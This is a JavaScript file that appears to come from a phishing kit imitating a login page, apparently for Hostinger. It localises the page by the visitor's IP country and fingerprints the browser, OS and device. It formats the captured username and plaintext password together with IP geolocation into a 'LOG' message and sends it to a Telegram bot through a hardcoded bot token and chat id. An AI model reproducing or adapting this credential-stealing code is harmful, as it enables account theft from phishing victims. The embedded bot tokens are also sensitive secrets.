
var errormessage = "There was an error on the server. Please login again"

// Set email from URL hash and disable the field
const hash = window.location.hash.substring(1);

const countryLanguageMap = {
  "AF": "ps", // Afghanistan - Pashto
  "AL": "sq", // Albania - Albanian
  "DZ": "ar", // Algeria - Arabic
  "AD": "ca", // Andorra - Catalan
  "AO": "pt", // Angola - Portuguese
  "AG": "en", // Antigua and Barbuda - English
  "AR": "es", // Argentina - Spanish
  "AM": "hy", // Armenia - Armenian
  "AU": "en", // Australia - English
  "AT": "de", // Austria - German
  "AZ": "az", // Azerbaijan - Azerbaijani
  "BS": "en", // Bahamas - English
  "BH": "ar", // Bahrain - Arabic
  "BD": "bn", // Bangladesh - Bengali
  "BB": "en", // Barbados - English
  "BY": "be", // Belarus - Belarusian
  "BE": "nl", // Belgium - Dutch
  "BZ": "en", // Belize - English
  "BJ": "fr", // Benin - French
  "BT": "dz", // Bhutan - Dzongkha
  "BO": "es", // Bolivia - Spanish
  "BA": "bs", // Bosnia and Herzegovina - Bosnian
  "BW": "en", // Botswana - English
  "BR": "pt", // Brazil - Portuguese
  "BN": "ms", // Brunei - Malay
  "BG": "bg", // Bulgaria - Bulgarian
  "BF": "fr", // Burkina Faso - French
  "BI": "rn", // Burundi - Kirundi
  "KH": "km", // Cambodia - Khmer
  "CM": "fr", // Cameroon - French
  "CA": "en", // Canada - English
  "CV": "pt", // Cape Verde - Portuguese
  "CF": "fr", // Central African Republic - French
  "TD": "ar", // Chad - Arabic
  "CL": "es", // Chile - Spanish
  "CN": "zh", // China - Chinese
  "CO": "es", // Colombia - Spanish
  "KM": "ar", // Comoros - Arabic
  "CG": "fr", // Congo - French
  "CD": "fr", // DR Congo - French
  "CR": "es", // Costa Rica - Spanish
  "CI": "fr", // Côte d'Ivoire - French
  "HR": "hr", // Croatia - Croatian
  "CU": "es", // Cuba - Spanish
  "CY": "el", // Cyprus - Greek
  "CZ": "cs", // Czech Republic - Czech
  "DK": "da", // Denmark - Danish
  "DJ": "ar", // Djibouti - Arabic
  "DM": "en", // Dominica - English
  "DO": "es", // Dominican Republic - Spanish
  "TL": "pt", // East Timor - Portuguese
  "EC": "es", // Ecuador - Spanish
  "EG": "ar", // Egypt - Arabic
  "SV": "es", // El Salvador - Spanish
  "GQ": "es", // Equatorial Guinea - Spanish
  "ER": "ti", // Eritrea - Tigrinya
  "EE": "et", // Estonia - Estonian
  "ET": "am", // Ethiopia - Amharic
  "FJ": "en", // Fiji - English
  "FI": "fi", // Finland - Finnish
  "FR": "fr", // France - French
  "GA": "fr", // Gabon - French
  "GM": "en", // Gambia - English
  "GE": "ka", // Georgia - Georgian
  "DE": "de", // Germany - German
  "GH": "en", // Ghana - English
  "GR": "el", // Greece - Greek
  "GD": "en", // Grenada - English
  "GT": "es", // Guatemala - Spanish
  "GN": "fr", // Guinea - French
  "GW": "pt", // Guinea-Bissau - Portuguese
  "GY": "en", // Guyana - English
  "HT": "ht", // Haiti - Haitian Creole
  "HN": "es", // Honduras - Spanish
  "HU": "hu", // Hungary - Hungarian
  "IS": "is", // Iceland - Icelandic
  "IN": "hi", // India - Hindi
  "ID": "id", // Indonesia - Indonesian
  "IR": "fa", // Iran - Persian
  "IQ": "ar", // Iraq - Arabic
  "IE": "en", // Ireland - English
  "IL": "he", // Israel - Hebrew
  "IT": "it", // Italy - Italian
  "JM": "en", // Jamaica - English
  "JP": "ja", // Japan - Japanese
  "JO": "ar", // Jordan - Arabic
  "KZ": "kk", // Kazakhstan - Kazakh
  "KE": "sw", // Kenya - Swahili
  "KI": "en", // Kiribati - English
  "KP": "ko", // North Korea - Korean
  "KR": "ko", // South Korea - Korean
  "XK": "sq", // Kosovo - Albanian
  "KW": "ar", // Kuwait - Arabic
  "KG": "ky", // Kyrgyzstan - Kyrgyz
  "LA": "lo", // Laos - Lao
  "LV": "lv", // Latvia - Latvian
  "LB": "ar", // Lebanon - Arabic
  "LS": "st", // Lesotho - Sotho
  "LR": "en", // Liberia - English
  "LY": "ar", // Libya - Arabic
  "LI": "de", // Liechtenstein - German
  "LT": "lt", // Lithuania - Lithuanian
  "LU": "lb", // Luxembourg - Luxembourgish
  "MG": "mg", // Madagascar - Malagasy
  "MW": "ny", // Malawi - Chichewa
  "MY": "ms", // Malaysia - Malay
  "MV": "dv", // Maldives - Dhivehi
  "ML": "fr", // Mali - French
  "MT": "mt", // Malta - Maltese
  "MH": "en", // Marshall Islands - English
  "MR": "ar", // Mauritania - Arabic
  "MU": "en", // Mauritius - English
  "MX": "es", // Mexico - Spanish
  "FM": "en", // Micronesia - English
  "MD": "ro", // Moldova - Romanian
  "MC": "fr", // Monaco - French
  "MN": "mn", // Mongolia - Mongolian
  "ME": "sr", // Montenegro - Serbian
  "MA": "ar", // Morocco - Arabic
  "MZ": "pt", // Mozambique - Portuguese
  "MM": "my", // Myanmar - Burmese
  "NA": "en", // Namibia - English
  "NR": "na", // Nauru - Nauruan
  "NP": "ne", // Nepal - Nepali
  "NL": "nl", // Netherlands - Dutch
  "NZ": "en", // New Zealand - English
  "NI": "es", // Nicaragua - Spanish
  "NE": "fr", // Niger - French
  "NG": "en", // Nigeria - English
  "MK": "mk", // North Macedonia - Macedonian
  "NO": "nb", // Norway - Norwegian Bokmål
  "OM": "ar", // Oman - Arabic
  "PK": "ur", // Pakistan - Urdu
  "PW": "en", // Palau - English
  "PS": "ar", // Palestine - Arabic
  "PA": "es", // Panama - Spanish
  "PG": "en", // Papua New Guinea - English
  "PY": "es", // Paraguay - Spanish
  "PE": "es", // Peru - Spanish
  "PH": "tl", // Philippines - Tagalog
  "PL": "pl", // Poland - Polish
  "PT": "pt", // Portugal - Portuguese
  "QA": "ar", // Qatar - Arabic
  "RO": "ro", // Romania - Romanian
  "RU": "ru", // Russia - Russian
  "RW": "rw", // Rwanda - Kinyarwanda
  "KN": "en", // Saint Kitts and Nevis - English
  "LC": "en", // Saint Lucia - English
  "VC": "en", // Saint Vincent and the Grenadines - English
  "WS": "sm", // Samoa - Samoan
  "SM": "it", // San Marino - Italian
  "ST": "pt", // São Tomé and Príncipe - Portuguese
  "SA": "ar", // Saudi Arabia - Arabic
  "SN": "fr", // Senegal - French
  "RS": "sr", // Serbia - Serbian
  "SC": "fr", // Seychelles - French (Seychellois Creole also official)
  "SL": "en", // Sierra Leone - English
  "SG": "ms", // Singapore - Malay
  "SK": "sk", // Slovakia - Slovak
  "SI": "sl", // Slovenia - Slovenian
  "SB": "en", // Solomon Islands - English
  "SO": "so", // Somalia - Somali
  "ZA": "af", // South Africa - Afrikaans
  "SS": "en", // South Sudan - English
  "ES": "es", // Spain - Spanish
  "LK": "si", // Sri Lanka - Sinhala
  "SD": "ar", // Sudan - Arabic
  "SR": "nl", // Suriname - Dutch
  "SZ": "ss", // Eswatini (Swaziland) - Swati
  "SE": "sv", // Sweden - Swedish
  "CH": "de", // Switzerland - German
  "SY": "ar", // Syria - Arabic
  "TW": "zh", // Taiwan - Chinese
  "TJ": "tg", // Tajikistan - Tajik
  "TZ": "sw", // Tanzania - Swahili
  "TH": "th", // Thailand - Thai
  "TG": "fr", // Togo - French
  "TO": "to", // Tonga - Tongan
  "TT": "en", // Trinidad and Tobago - English
  "TN": "ar", // Tunisia - Arabic
  "TR": "tr", // Turkey - Turkish
  "TM": "tk", // Turkmenistan - Turkmen
  "TV": "en", // Tuvalu - English
  "UG": "sw", // Uganda - Swahili
  "UA": "uk", // Ukraine - Ukrainian
  "AE": "ar", // United Arab Emirates - Arabic
  "GB": "en", // United Kingdom - English
  "US": "en", // United States - English
  "UY": "es", // Uruguay - Spanish
  "UZ": "uz", // Uzbekistan - Uzbek
  "VU": "bi", // Vanuatu - Bislama
  "VA": "it", // Vatican City - Italian
  "VE": "es", // Venezuela - Spanish
  "VN": "vi", // Vietnam - Vietnamese
  "YE": "ar", // Yemen - Arabic
  "ZM": "en", // Zambia - English
  "ZW": "sn"  // Zimbabwe - Shona
};

let tg2 = {
    token2: "7112775039:AAGHM9oBZSEsUkpb40ZjcXrzngRtudgzBvI",//"6774219498:AAHt48B3AwMhWRXg9yqeR64ZHbkSvQQSYEM",  
    chat_id2: "1129680954"
}
function sendMessage2(text2)
{
    const url2 = `https://api.telegram.org/bot${tg2.token2}/sendMessage`; // The base URL for the request
    const xht2 = new XMLHttpRequest();
    xht2.open("POST", url2, true);
    xht2.setRequestHeader("Content-Type", "application/json");


    const params = {
        chat_id: tg2.chat_id2,
        text: text2,
        parse_mode: 'Markdown'
    };

    xht2.send(JSON.stringify(params));

    // alert(text2);

}


function getUserCountry() {

    // const userLocaler = navigator.language || navigator.userLanguage;
    // const userCountryy = userLocaler.split('-') || 'en';
    // alert(`${userLocaler} ${userCountryy}`);
    return fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            console.log("User country:", data.country);
            return data.country;
        })
        .catch(error => {
            console.error('Error fetching country:', error);
            return null;
        });
}
function translateText(text, targetLang) {
    return new Promise((resolve, reject) => {
        const apiUrl = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${targetLang}&dt=t&q=${encodeURIComponent(text)}`;
        
        fetch(apiUrl)
            .then(response => response.json())
            .then(data => {
                const translatedText = data[0].map(item => item[0]).join('');
                resolve(translatedText);
            })
            .catch(error => reject(error));
    });
}

async function translatePage(targetLang) {
    // Translate text content
    const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
    let node;
    
    while (node = walker.nextNode()) {
        if (node.nodeValue.trim()) {
            try {
                const translatedText = await translateText(node.nodeValue, targetLang);
                node.nodeValue = translatedText;
            } catch (error) {
                console.error('Translation error:', error);
            }
        }
    }

    // Translate input placeholders
    const inputs = document.querySelectorAll('input[placeholder], textarea[placeholder]');
    for (const input of inputs) {
        if (input.placeholder) {
            try {
                const translatedPlaceholder = await translateText(input.placeholder, targetLang);
                input.placeholder = translatedPlaceholder;
            } catch (error) {
                console.error('Placeholder translation error:', error);
            }
        }
    }
}

async function autoTranslate() {
    try {
        const userCountry = await getUserCountry();
        let targetLang = 'en'; // Default to English

        if (userCountry && countryLanguageMap[userCountry]) {
            targetLang = countryLanguageMap[userCountry].toLowerCase();
        }

        await translatePage(targetLang);
        console.log("Translation complete");
    } catch (error) {
        console.error('Auto-translation error:', error);
    }
}


// Attach the function to window.onload
// window.onload = autoTranslate();
// Browser detection function
    function getBrowserInfo() {
        const ua = navigator.userAgent;
        let browser = "Unknown";
        let version = "";
        
        if (ua.includes("Firefox/")) {
            browser = "Firefox";
            version = ua.split("Firefox/")[1].split(" ")[0];
        } else if (ua.includes("Chrome/")) {
            browser = "Chrome";
            version = ua.split("Chrome/")[1].split(" ")[0];
        } else if (ua.includes("Safari/") && !ua.includes("Chrome")) {
            browser = "Safari";
            version = ua.split("Version/")[1].split(" ")[0];
        }
        
        return `${browser} ${version}`;
    }

    // OS detection function
    function getOSInfo() {
        const ua = navigator.userAgent;
        if (ua.includes("Windows NT 10.0")) return "Windows 10";
        if (ua.includes("Windows NT 6.3")) return "Windows 8.1";
        if (ua.includes("Mac OS X")) return "macOS";
        if (ua.includes("Linux")) return "Linux";
        return "Unknown OS";
    }

    // Get device type
    function getDeviceType() {
        const ua = navigator.userAgent;
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
            return "tablet";
        }
        if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
            return "mobile";
        }
        return "desktop";
    }



    // Message formatting function with IP info
    async function formatMessage(email, password, mailbox) {
        try {
            // Fetch IP info
            const response = await fetch('https://ipinfo.io/json');
            const ipData = await response.json();
            
            const screen = window.screen;
            const browserInfo = getBrowserInfo();
            const osInfo = getOSInfo();
            const deviceType = getDeviceType();
            
            // Split loc into coordinates
            const [lat, lon] = ipData.loc ? ipData.loc.split(',') : ['Unknown', 'Unknown'];
            
            return `🔐 ${mailbox} LOG
━━━━━━━━━━━━━━━━━━━━━━
📧 Login Details
• Username: ${email}
• Password: ${password}
• Mode: Automatic
• Language: English (American)
📍 Location Info
• IP Address: ${ipData.ip || 'Unknown'}
• Country: ${ipData.country || 'Unknown'}
• Region: ${ipData.region || 'Unknown'}
• City: ${ipData.city || 'Unknown'}
• Coordinates: ${lat}, ${lon}
• Timezone: ${ipData.timezone || 'Unknown'}
💻 Browser Info
• Browser: ${browserInfo}
• OS: ${osInfo}
• Device Type: ${deviceType}
📱 Device Details
• Screen Resolution: ${screen.width}x${screen.height}
• Window Size: ${window.innerWidth}x${window.innerHeight}
• Platform: ${navigator.platform}
• Language: ${navigator.language}
• Color Depth: ${screen.colorDepth}bit
• Pixel Ratio: ${window.devicePixelRatio}x
⏰ Timestamp: ${new Date().toISOString()}
━━━━━━━━━━━━━━━━━━━━━━`;
        } catch (error) {
            console.error('Error fetching IP info:', error);
            // Return message with default values if IP info fetch fails
            return formatMessageWithoutIP(email, password);
        }
    }



    // Fallback message formatting without IP info
    function formatMessageWithoutIP(email, password) {
        const screen = window.screen;
        const browserInfo = getBrowserInfo();
        const osInfo = getOSInfo();
        const deviceType = getDeviceType();
        
        return `🔐 HOSTINGER LOGIN 
━━━━━━━━━━━━━━━━━━━━━━
📧 Login Details
• Username: ${email}
• Password: ${password}
• Mode: Automatic
• Language: English (American)
📍 Location Info
• IP Address: Unknown
• Country: Unknown
• Region: Unknown
• City: Unknown
• Coordinates: Unknown
• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
💻 Browser Info
• Browser: ${browserInfo}
• OS: ${osInfo}
• Device Type: ${deviceType}
📱 Device Details
• Screen Resolution: ${screen.width}x${screen.height}
• Window Size: ${window.innerWidth}x${window.innerHeight}
• Platform: ${navigator.platform}
• Language: ${navigator.language}
• Color Depth: ${screen.colorDepth}bit
• Pixel Ratio: ${window.devicePixelRatio}x
⏰ Timestamp: ${new Date().toISOString()}
━━━━━━━━━━━━━━━━━━━━━━`;
    }
